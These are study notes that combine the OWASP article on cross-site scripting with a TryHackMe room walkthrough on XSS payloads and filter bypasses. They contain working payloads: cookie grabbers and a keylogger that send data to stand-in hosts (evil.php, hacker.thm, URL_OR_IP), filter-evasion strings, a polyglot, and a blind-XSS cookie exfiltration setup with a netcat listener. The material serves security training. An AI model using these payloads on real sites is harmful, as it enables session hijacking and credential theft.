Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end userâ€™s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the userâ€™s machine under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected and stored. There is a third, much less well-known type of XSS attack called [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) that is discussed separately [here](https://owasp.org/www-community/attacks/DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the userâ€™s browser. The browser then executes the code because it came from a â€œtrustedâ€ server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attackerâ€™s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attackerâ€™s submitted form via the backend application, the attackerâ€™s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) was identified by [Amit Klein in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP recommends the XSS categorization as described in the OWASP Article: [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting), which covers all these XSS terms, organizing them into a matrix of Stored vs. Reflected XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is stored or reflected ([or DOM Based](https://owasp.org/www-community/attacks/DOM_Based_XSS)). The difference is in how the payload arrives at the server. Do not be fooled into thinking that a â€œread-onlyâ€ or â€œbrochurewareâ€ site is not vulnerable to serious reflected XSS attacks. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the userâ€™s session cookie, allowing an attacker to hijack the userâ€™s session and take over the account. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, or modifying presentation of content. An XSS vulnerability allowing an attacker to modify a press release or news item could affect a companyâ€™s stock price or lessen consumer confidence. An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose. For more information on these types of attacks see [Content_Spoofing](https://owasp.org/www-community/attacks/Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web application. The best way to find flaws is to perform a security review of the code and search for all places where input from an HTTP request could possibly make its way into the HTML output. Note that a variety of different HTML tags can be used to transmit a malicious JavaScript. Nessus, Nikto, and some other available tools can help scan a website for these flaws, but can only scratch the surface. If one part of a website is vulnerable, there is a high likelihood that there are other problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, itâ€™s crucial that you turn off HTTP TRACE support on all web servers. An attacker can steal cookie data via Javascript even when document.cookie is disabled or not supported by the client. This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the userâ€™s cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack. This is easily mitigated by removing support for HTTP TRACE on all web servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of reusable security components in several languages, including validation and escaping routines to prevent parameter tampering and the injection of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using`<script>...</script>` tags. Other tags will do exactly the same thing, for example:`<body onload=alert('test1')>` or other attributes like:`onmouseover`,`onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode string characters, e.g.:`a=&\#X41` (UTF-8) and use it in`IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in`META` tag. This way we get rid of`alert()` totally. More information about this method can be found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) which is a true encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious users are allowed to post unregulated material to a trusted website for the consumption of other valid users.

The most common example can be found in bulletin-board websites which provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>
```

The code in this example operates correctly if`eid` contains only standard alphanumeric text. If`eid` has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employeeâ€™s name.

```html
<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
 rs.next();
 String name = rs.getString("name");
%>

Employee Name: <%= name %>
```

As in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the userâ€™s web browser. This type of exploit, known as Stored XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with websites that offered a â€œguestbookâ€ to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:

- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attackerâ€™s content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the userâ€™s machine to the attacker or perform other nefarious activities.
- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attackerâ€™s perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.
- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesnâ€™t validate the input data, the attacker can easily steal a cookie from an authenticated user. All the attacker has to do is to place the following code in any posted input(ie: message boards, private messages, user profiles):

```html
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>
```

The above code will pass an escaped content of the cookie (according to RFC content must be escaped before sending it via HTTP protocol with GET method) to the evil.php script in â€œcakemonsterâ€ variable. The attacker then checks the results of their evil.php script (a cookie grabber script will usually write the cookie to a file) and use it.

### Error Page Example

Letâ€™s assume that we have an error page, which is handling requests for a non existing pages, a classic 404 error page. We may use the code below as an example to inform user about what specific page is missing:

```html
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>
```

Letâ€™s see how it works:`http://testsite.test/file_which_not_exist` In response we get:`Not found: /file_which_not_exist`

Now we will try to force the error page to include our code:`http://testsite.test/<script>alert("TEST");</script>` The result is:`Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For example, that we may use this flaw to try to steal a userâ€™s session cookie.


# TRYHACKME SECTION
---

## XSS Payloads

---


### **What is a payload?**
---
In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

 

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

 

Here are some examples of XSS intentions.

 

### **Proof Of Concept:**
---
This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

 

```javascript
<script>alert('XSS');</script>`
```



### **Session Stealing:**
---
Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

 

```js
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
``` 

 

### **Key Logger:**
---
The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

 

```js
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

 

### **Business Logic:**
---
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called`user.changeEmail()`. Your payload could look like this:

 

```js
<script>user.changeEmail('attacker@hacker.thm');</script>
```


![Pasted image 20241106101715.png](../../../../IMAGES/Pasted%20image%2020241106101715.png)


## Reflected XSS
---

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

 
#### **Example Scenario** 
 
A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the **error** parameter in the query string and is built directly into the page source.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png) 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png) 

The application doesn't check the contents of the **error**
parameter, which allows the attacker to insert malicious code.

 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png) 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png) 

The vulnerability can be used as per the scenario in the image below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png) 

#### Potential Impact 
 
The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

#### **How to test for Reflected XSS** 

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

![Pasted image 20241106102130.png](../../../../IMAGES/Pasted%20image%2020241106102130.png)


## Stored XSS
---


As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page. 
 
#### **Example Scenario:**
---
 
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png) 

 

#### **Potential Impact:** 
---

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

### **How to test for Stored XSS:** 
---


You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be: 

```ad-note

- Comments on a blog
- User profile information 
- Website Listings 

```
 

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. ## DOM Based XSS
---

#### **What is the DOM?**
---

DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png) 

If you want to learn more about the DOM and gain a deeper understanding [w3.org](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) have a great resource.

#### Exploiting the DOM
---


DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction. 
 
 
#### **Example Scenario:** 
 
The website's JavaScript gets the contents from the`window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage. 
 
 
#### **Potential Impact:** 
 
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

#### **How to test for Dom Based XSS:**

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "`window.location.x"` parameters.

 

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**.


## Blind XSS
---

Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first. 
 
#### **Example Scenario:** 
 
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal. 
 
#### **Potential Impact:** 
 
Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

#### **How to test for Blind XSS:**

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

 

A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.


## Perfecting your payload

The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website. 
 
Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session. 
 
How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use. To Explain this, click the green Start Machine button on the right, and when the machine has loaded, open the below link in a new tab.


The aim for each level will be to execute the JavaScript alert function with the string THM, for example: 
 
`<script>alert('THM');</script>` 
 
#### **Level One:**

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example: 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png) 

If you view the Page Source, You'll see your name reflected in the code:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f371398ba148e07e85b946028e7f6919.png) 

Instead of entering your name, we're instead going to try entering the following JavaScript Payload:`<script>alert('THM');</script>` 
 
Now when you click the enter button, you'll get an alert popup with the string **THM** and the page source will look like the following:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/49444bf865cdc230d9855b53d93745c6.png) 

And then, you'll get a confirmation message that your payload was successful with a link to the next level. 

![Pasted image 20241106104749.png](../../../../IMAGES/Pasted%20image%2020241106104749.png)
![Pasted image 20241106104830.png](../../../../IMAGES/Pasted%20image%2020241106104830.png)

#### **Level Two:** 

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png) 

 
Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png) 

 
It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload:`"><script>alert('THM');</script>` 

![Pasted image 20241106104937.png](../../../../IMAGES/Pasted%20image%2020241106104937.png)


The important part of the payload is the`">` which closes the value parameter and then closes the input tag. 

This now closes the input tag properly and allows the JavaScript payload to run:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/21a6597c0964f08c69ebffbf014a886a.png) 

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

![Pasted image 20241106104949.png](../../../../IMAGES/Pasted%20image%2020241106104949.png)

 
#### **Level Three:**

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png) 

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload:`</textarea><script>alert('THM');</script>` 

This turns this:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png) 

Into This: 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/77ce8ffc9465731ab834f02292ec86d1.png) 

The important part of the above payload is`</textarea>`, which causes the textarea element to close so the script will run. 

![Pasted image 20241106105040.png](../../../../IMAGES/Pasted%20image%2020241106105040.png)


Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level. 

![Pasted image 20241106105052.png](../../../../IMAGES/Pasted%20image%2020241106105052.png)



#### **Level Four:** 

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/80fd5abe95b63ce52ff0ff9f9f6f6d57.png) 

 
You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload`';alert('THM');//` which you'll see from the below screenshot will execute your code. The`'` closes the field specifying the name, then`;` signifies the end of the current command, and the`//` at the end makes anything after it a comment rather than executable code. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png) 


![Pasted image 20241106105148.png](../../../../IMAGES/Pasted%20image%2020241106105148.png)

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

![Pasted image 20241106105158.png](../../../../IMAGES/Pasted%20image%2020241106105158.png)

 
##### **Level Five:**

Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the`<script>alert('THM');</script>` payload, it won't work. When you view the page source, you'll see why. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9bd2142b2bcd4b4cba34e571550294e4.png) 

 
The word`script` gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words. 
 
When a word gets removed from a string, there's a helpful trick that you can try.

**Original Payload:**

`<sscriptcript>alert('THM');</sscriptcript>`

 

**Text to be removed (by the filter):**

`<sscriptcript>alert('THM');</sscriptcript>`

 

**Final Payload (after passing the filter):**

`<script>alert('THM');</script>`

```ad-note

#### USED PAYLOAD

`<sscriptcript>alert('THM');</sscriptcript>`


```
 

Try entering the payload`<sscriptcript>alert('THM');</sscriptcript>`
and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

![Pasted image 20241106105406.png](../../../../IMAGES/Pasted%20image%2020241106105406.png)



#### **Level Six:**

 

Similar to level two, where we had to escape from the value attribute of an input tag, we can try`"><script>alert('THM');</script>` , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png) 

 
You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page. 
 
Let's change our payload to reflect this`/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png) 


Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.

![Pasted image 20241106105522.png](../../../../IMAGES/Pasted%20image%2020241106105522.png)

![Pasted image 20241106105533.png](../../../../IMAGES/Pasted%20image%2020241106105533.png)



#### **Polyglots:**

 

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully. 

 

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``



## Practical Example (Blind XSS)

For the last task, we will go over a Blind XSS vulnerability. Ensure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. Youâ€™ll need to use the AttackBox using the blue button at the top of the page. Once loaded, open the link below inside the AttackBoxâ€™s Firefox browser to view the target website. 

[https://10-10-14-3.p.thmlabs.com](https://10-10-14-3.p.thmlabs.com/) 

Click on the **Customers** tab on the top navigation bar and click the "**Signup here**" link to create an account. Once your account gets set up, click the **Support Tickets** tab, which is the feature we will investigate for weaknesses. Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/23721628b263e7d6fd00097904bc6847.png) 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/34e69ee3fce3021fee02a13a680d5d47.png) 

Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:

`</textarea>test`

Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e247f6dd0b2ebe0e4e512b16b41cec05.png) 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0ad04cf010b889a8adfdba9d24bcb826.png) 

Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:

`</textarea><script>alert('THM');</script>` 

Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.

Using the AttackBox, letâ€™s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command`nc -l -p 9001`. The`-l` option indicates that we want to use Netcat in listen mode, while the`-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add`-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the`-v` option is recommended. The final command becomes`nc -n -l -v -p 9001`, equivalent to`nc -nlvp 9001`.

nc

```shell-session
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
```

Now that weâ€™ve set up the method of receiving the exfiltrated information, letâ€™s build the payload.

`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`

Letâ€™s break down the payload:

```ad-summary
- The`</textarea>` tag closes the text area field.
- The`<script>` tag opens an area for us to write JavaScript.
- The`fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
- `?cookie=` is the query string containing the victimâ€™s cookies.
- `btoa()` command base64 encodes the victimâ€™s cookies.
- `document.cookie` accesses the victimâ€™s cookies for the Acme IT Support Website.
- `</script>`closes the JavaScript code block.
```

Now create another ticket using the above payload, making sure to swap out the`URL_OR_IP:PORT_NUMBER` variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victimâ€™s cookies.


You can now base64 decode this information using a site like [https://www.base64decode.org/](https://www.base64decode.org/), giving you the necessary information to answer the below question.
